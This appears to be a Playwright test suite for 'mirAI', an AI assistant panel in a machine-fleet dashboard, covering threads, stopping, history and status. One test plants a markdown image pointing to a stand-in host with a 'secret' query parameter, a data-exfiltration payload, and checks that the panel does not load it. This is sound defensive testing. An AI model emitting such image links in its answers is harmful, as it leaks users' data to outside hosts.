import { expect, test, type Page } from "@playwright/test";
import { AskSchema, type MiraiEvent } from "../src/shared/mirai";
import { miraiThread, miraiTurn, mockHub, mockMirai } from "./fixtures";

const panel = (page: Page) => page.getByRole("complementary", { name: "mirAI" });

async function openPanel(page: Page, path: string) {
  await page.goto(path);
  await expect(page.getByRole("button", { name: /search or ask mirAI/ })).toBeVisible();
  await expect(async () => {
    if (!(await panel(page).isVisible())) await page.keyboard.press("ControlOrMeta+j");
    await expect(panel(page)).toBeVisible({ timeout: 500 });
  }).toPass();
}

const answered = (question: string, view: string, answer: string): MiraiEvent[] => {
  const thread = miraiThread({ turns: [miraiTurn({ question, view, answer, thinking: "They mean omarikato. Check memory.", calls: [{ id: "c1", label: "read machines · omarikato", change: false, ok: true }, { id: "c2", label: "read ship · pull requests", change: false, ok: true }] })] });
  return [
    { type: "thread", threadId: thread.id },
    { type: "thinking", delta: "They mean omarikato. Check memory." },
    { type: "call", id: "c1", label: "read machines · omarikato", change: false },
    { type: "call_end", id: "c1", ok: true },
    { type: "call", id: "c2", label: "read ship · pull requests", change: false },
    { type: "call_end", id: "c2", ok: true },
    { type: "text", delta: answer },
    { type: "done", thread },
  ];
};

test.beforeEach(async ({ page }) => {
  await mockHub(page);
});

test("a question from the panel carries the page it was asked on and settles into a folded thought and a linked answer", async ({ page }) => {
  const asked: unknown[] = [];
  const events = answered("could this box be stalling CI?", "omarikato / host", "Likely yes. [omarikato](/machines/omarikato) has 1.1 GB free.");
  const done = events.at(-1);
  await mockMirai(page, {
    thread: done?.type === "done" ? done.thread : null,
    ask: async body => {
      asked.push(body);
      return { status: 200, ndjson: events };
    },
  });
  await openPanel(page, "/machines/omarikato");
  await panel(page).getByRole("textbox", { name: "ask mirAI" }).fill("could this box be stalling CI?");
  await page.keyboard.press("Enter");

  await expect(panel(page).getByText("Likely yes.")).toBeVisible();
  expect(asked).toEqual([{ threadId: null, question: "could this box be stalling CI?", view: "omarikato / host" }]);
  const fold = panel(page).getByRole("button", { name: /thought 5s · 2 reads/ });
  await expect(fold).toHaveAttribute("aria-expanded", "false");
  await expect(panel(page).getByText("They mean omarikato. Check memory.")).toBeHidden();
  await fold.click();
  await expect(panel(page).getByText("They mean omarikato. Check memory.")).toBeVisible();
  await expect(panel(page).getByText("· read machines · omarikato")).toBeVisible();
  await expect(panel(page).getByText("thread $0.02")).toBeVisible();

  await openPanel(page, "/machines");
  await panel(page).getByRole("link", { name: "omarikato" }).click();
  await expect(page).toHaveURL(/\/machines\/omarikato$/);
});

test("the next question continues the same thread, and new starts a fresh one", async ({ page }) => {
  const asked: { threadId: string | null }[] = [];
  await mockMirai(page, {
    ask: async body => {
      asked.push(AskSchema.parse(body));
      return { status: 200, ndjson: answered("q", "fleet", "ok") };
    },
  });
  await openPanel(page, "/machines");
  const box = panel(page).getByRole("textbox", { name: "ask mirAI" });
  await box.fill("first");
  await page.keyboard.press("Enter");
  await expect(panel(page).getByText("ok")).toBeVisible();
  await box.fill("second");
  await page.keyboard.press("Enter");
  await expect.poll(() => asked.length).toBe(2);
  await panel(page).getByRole("button", { name: "new" }).click();
  await expect(panel(page).getByText("ask about fleet")).toBeVisible();
  await box.fill("third");
  await page.keyboard.press("Enter");
  await expect.poll(() => asked.map(a => a.threadId)).toEqual([null, miraiThread().id, null]);
});

test("esc stops a running answer and the turn is marked stopped", async ({ page }) => {
  const earlier = miraiTurn({ question: "what next?", view: "fleet", answer: "DB-412." });
  const stopped: unknown[] = [];
  let release = () => {};
  const held = new Promise<void>(r => (release = r));
  await page.addInitScript(id => localStorage.setItem("mirai-thread", JSON.stringify({ state: { threadId: id }, version: 0 })), miraiThread().id);
  await mockMirai(page, {
    thread: miraiThread({ turns: [earlier] }),
    ask: async () => {
      await held;
      const thread = miraiThread({ turns: [earlier, miraiTurn({ question: "slow one", view: "fleet", answer: "", thinking: "", calls: [], status: "stopped" })] });
      return { status: 200, ndjson: [{ type: "thread", threadId: thread.id }, { type: "done", thread }] };
    },
  });
  await page.route("**/api/mirai/stop", r => {
    stopped.push(r.request().postDataJSON());
    release();
    return r.fulfill({ json: { ok: true } });
  });
  await openPanel(page, "/machines");
  await expect(panel(page).getByText("DB-412.")).toBeVisible();
  await panel(page).getByRole("textbox", { name: "ask mirAI" }).fill("slow one");
  await page.keyboard.press("Enter");
  await expect(panel(page).getByText("mirAI is answering")).toBeVisible();
  await expect(panel(page).getByText(/^thinking \d+s$/)).toBeVisible();
  await page.keyboard.press("Escape");
  await expect(panel(page).getByText("stopped", { exact: true })).toBeVisible();
  expect(stopped).toEqual([{ threadId: miraiThread().id }]);
  await expect(panel(page).getByRole("textbox", { name: "ask mirAI" })).toBeVisible();
});

test("history lists threads with where they started and what they cost, resumes one, and deletes after a confirm", async ({ page }) => {
  const old = miraiThread({ id: "01a0ddaa-0000-7000-8000-00000000beef", turns: [miraiTurn({ question: "why is omarikato slow?", view: "omarikato / host", answer: "Chromium lanes." })] });
  const deleted: unknown[] = [];
  await mockMirai(page, {
    threads: [{ id: old.id, title: old.title, view: old.view, startedAt: old.startedAt, updatedAt: old.updatedAt, questions: 1, costUsd: 0.02, spend: old.spend }],
    thread: old,
  });
  await page.route("**/api/mirai/delete", r => {
    deleted.push(r.request().postDataJSON());
    return r.fulfill({ json: { ok: true } });
  });
  await openPanel(page, "/tasks/linear");
  await panel(page).getByRole("button", { name: "history" }).click();
  await expect(panel(page).getByText(/omarikato \/ host · .+ · 1 q · \$0\.02/)).toBeVisible();
  await expect(panel(page).getByText("1 thread · $0.02 this week")).toBeVisible();
  await panel(page).getByRole("button", { name: "why is omarikato slow?", exact: true }).click();
  await expect(panel(page).getByText("Chromium lanes.")).toBeVisible();

  await panel(page).getByRole("button", { name: "history" }).click();
  await panel(page).getByRole("button", { name: "delete thread why is omarikato slow?" }).click();
  await panel(page).getByRole("button", { name: "keep" }).click();
  expect(deleted).toEqual([]);
  await panel(page).getByRole("button", { name: "delete thread why is omarikato slow?" }).click();
  await panel(page).getByRole("button", { name: "delete", exact: true }).click();
  await expect.poll(() => deleted).toEqual([{ threadId: old.id }]);
});

test("a thread still answering on another device says so and refuses a second question", async ({ page }) => {
  await page.addInitScript(id => localStorage.setItem("mirai-thread", JSON.stringify({ state: { threadId: id }, version: 0 })), miraiThread().id);
  await mockMirai(page, { thread: miraiThread({ busy: true, turns: [miraiTurn({ status: "answering", answer: "", thinking: "", calls: [] })] }) });
  await openPanel(page, "/machines");
  await expect(panel(page).getByText("answering in another tab or device")).toHaveCount(2);
  await expect(panel(page).getByRole("textbox", { name: "ask mirAI" })).toBeHidden();
  await expect(panel(page).getByRole("button", { name: "stop", exact: true })).toBeVisible();
});

test("a question the hub refuses stays in the box with the reason", async ({ page }) => {
  await mockMirai(page, { ask: async () => ({ status: 409, error: "mirAI is still answering this thread on another device" }) });
  await openPanel(page, "/machines");
  const box = panel(page).getByRole("textbox", { name: "ask mirAI" });
  await box.fill("is it hot?");
  await page.keyboard.press("Enter");
  await expect(panel(page).getByText("mirAI is still answering this thread on another device")).toBeVisible();
  await expect(box).toHaveValue("is it hot?");
});

test("an image in an answer is not loaded", async ({ page }) => {
  const fetched: string[] = [];
  await page.route("https://leak.test/**", r => {
    fetched.push(r.request().url());
    return r.fulfill({ status: 204 });
  });
  await mockMirai(page, { ask: async () => ({ status: 200, ndjson: answered("q", "fleet", "Here. ![x](https://leak.test/?d=secret)") }) });
  await openPanel(page, "/machines");
  await panel(page).getByRole("textbox", { name: "ask mirAI" }).fill("q");
  await page.keyboard.press("Enter");
  await expect(panel(page).getByText("Here.")).toBeVisible();
  await expect(panel(page).locator("img")).toHaveCount(0);
  expect(fetched).toEqual([]);
});

test("without a key the panel says mirAI is off and why", async ({ page }) => {
  await mockMirai(page, { status: { kind: "off", reason: "OPENAI_API_KEY is not set in ~/.config/mirai/hub.env" } });
  await openPanel(page, "/machines");
  await expect(panel(page).getByText("mirAI off")).toBeVisible();
  await expect(panel(page).getByText("OPENAI_API_KEY is not set in ~/.config/mirai/hub.env")).toBeVisible();
  await expect(panel(page).getByRole("textbox", { name: "ask mirAI" })).toBeDisabled();
});

test("calls fold into the thought while file changes stay visible under the answer", async ({ page }) => {
  const calls = [
    { id: "c1", label: "$ rg -n stall ~/Documents/llm-wiki", change: false, ok: true },
    { id: "c2", label: "wrote ~/Documents/llm-wiki/Omarikato CI Stalls.md +42", change: true, ok: true },
    { id: "c3", label: "$ rm /tmp/stall.log", change: true, ok: false },
  ];
  const thread = miraiThread({ turns: [miraiTurn({ question: "write up the stall", view: "fleet", answer: "Wrote the page.", thinking: "Check the wiki first.", calls })] });
  await mockMirai(page, {
    thread,
    ask: async () => ({
      status: 200,
      ndjson: [
        { type: "thread", threadId: thread.id },
        ...calls.flatMap((r): MiraiEvent[] => [
          { type: "call", id: r.id, label: r.label, change: r.change },
          { type: "call_end", id: r.id, ok: r.ok },
        ]),
        { type: "text", delta: "Wrote the page." },
        { type: "done", thread },
      ],
    }),
  });
  await openPanel(page, "/machines");
  await panel(page).getByRole("textbox", { name: "ask mirAI" }).fill("write up the stall");
  await page.keyboard.press("Enter");

  await expect(panel(page).getByText("Wrote the page.")).toBeVisible();
  await expect(panel(page).getByText("✎ wrote ~/Documents/llm-wiki/Omarikato CI Stalls.md +42")).toBeVisible();
  await expect(panel(page).getByText("✕ $ rm /tmp/stall.log")).toBeVisible();
  await expect(panel(page).getByText("· $ rg -n stall ~/Documents/llm-wiki")).toBeHidden();
  await panel(page).getByRole("button", { name: /thought 5s · 1 read ▸/ }).click();
  await expect(panel(page).getByText("· $ rg -n stall ~/Documents/llm-wiki")).toBeVisible();
});
